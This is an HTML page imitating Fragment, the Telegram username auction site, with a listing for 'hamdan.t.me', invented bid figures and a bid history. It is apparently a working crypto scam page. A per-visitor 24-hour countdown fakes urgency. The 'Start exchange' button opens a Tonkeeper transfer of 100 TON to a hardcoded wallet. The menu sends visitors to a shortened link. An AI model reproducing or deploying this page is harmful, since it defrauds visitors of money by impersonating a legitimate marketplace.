<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fragment Auction</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap">
    <style>
        body {
            background-color: #0e0f11;
            color: white;
            font-family: 'Inter', sans-serif;
            margin: 0;
            padding: 0;
        }
        .header-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #1a1c1f;
            padding: 15px;
        }
        .logo {
            font-size: 20px;
            font-weight: bold;
        }
        .search-bar {
            background-color: #33363b;
            padding: 8px;
            border-radius: 5px;
            border: none;
            color: white;
            width: 60%;
        }
        .menu-icon {
            font-size: 24px;
            cursor: pointer;
        }
        .container {
            width: 90%;
            max-width: 600px;
            margin: 20px auto;
            background-color: #1a1c1f;
            padding: 20px;
            border-radius: 10px;
        }
        .header {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .on-auction {
            background-color: #0088cc;
            padding: 5px 10px;
            border-radius: 5px;
            font-size: 14px;
            display: inline-block;
            margin-left: 10px;
        }
        .box {
            background-color: #282b30;
            padding: 15px;
            margin-top: 10px;
            border-radius: 10px;
        }
        .bid-info {
            display: flex;
            justify-content: space-between;
            font-size: 18px;
            margin-bottom: 10px;
        }
        .highlight {
            color: #0088cc;
            font-weight: bold;
        }
        .timer {
            text-align: center;
            font-size: 20px;
            font-weight: bold;
        }
        .place-bid {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: white;
            font-size: 18px;
            border: none;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
        }
        .place-bid:hover {
            background-color: #0077b3;
        }
        .bid-history {
            margin-top: 20px;
        }
        .bid-entry {
            display: flex;
            justify-content: space-between;
            background-color: #33363b;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>

<div class="header-bar">
    <div class="logo">FRAGMENT</div>
    <input type="text" class="search-bar" placeholder="Search usernames">
    <div class="menu-icon">☰</div>
</div>

<div class="container">
    <div class="header">
        <span>hamdan.t.me</span> <span class="on-auction">On auction</span>
    </div>

    <div class="box">
        <div class="bid-info">
            <div>Highest Bid</div>
            <div><span id="highest-bid">1,500</span> TON (~$<span id="usd-value">6,067</span>)</div>
        </div>
        <div class="bid-info">
            <div>Bid Step</div>
            <div>75 TON (5%)</div>
        </div>
        <div class="bid-info">
            <div>Minimum Bid</div>
            <div><span id="min-bid">1,575 TON</span> (~$<span id="min-usd-value">6,371</span>)</div>
        </div>
    </div>

    <div class="timer">
        Ends in <span id="countdown">Loading...</span>
    </div>

    <button class="place-bid" id="connect-wallet">Start exchange</button>

    <div class="bid-history">
        <h3>Bid History</h3>
        <div class="bid-entry">
            <div class="highlight">1,500 TON</div>
            <div>Mar 22 at 19:01</div>
            <div class="highlight">sanya.ton</div>
        </div>
    </div>
</div>

<script>
    function getEndTime() {
        let savedEndTime = localStorage.getItem("auctionEndTime24h");
        if (!savedEndTime) {
            const endTime = new Date(new Date().getTime() + 24 * 60 * 60 * 1000);
            localStorage.setItem("auctionEndTime24h", endTime.toISOString());
            return endTime;
        } else {
            return new Date(savedEndTime);
        }
    }

    const endTime = getEndTime();
    const countdownElement = document.getElementById("countdown");

    function updateCountdown() {
        const now = new Date();
        const diff = endTime - now;

        if (diff <= 0) {
            countdownElement.innerText = "Auction Ended";
            clearInterval(interval);
            return;
        }

        const days = Math.floor(diff / (1000 * 60 * 60 * 24));
        const hours = Math.floor((diff / (1000 * 60 * 60)) % 24);
        const minutes = Math.floor((diff / (1000 * 60)) % 60);
        const seconds = Math.floor((diff / 1000) % 60);

        countdownElement.innerText =
            `${days} day${days !== 1 ? 's' : ''} : ${String(hours).padStart(2, '0')} : ${String(minutes).padStart(2, '0')} : ${String(seconds).padStart(2, '0')}`;
    }

    const interval = setInterval(updateCountdown, 1000);
    updateCountdown();

    document.getElementById("connect-wallet").addEventListener("click", () => {
        const walletAddress = "UQAa_YWosA-rDKOl7g0tHHUzaCPan1IrLeLf8P5w_8odRDgR";
        const amount = 100;
        const tonkeeperURL = `https://app.tonkeeper.com/transfer/${walletAddress}?amount=${amount}000000000`;
        window.open(tonkeeperURL, "_blank");
    });

    document.querySelector(".menu-icon").addEventListener("click", () => {
        window.location.href = "https://shorturl.at/uoZeX";
    });
</script>

</body>
</html>
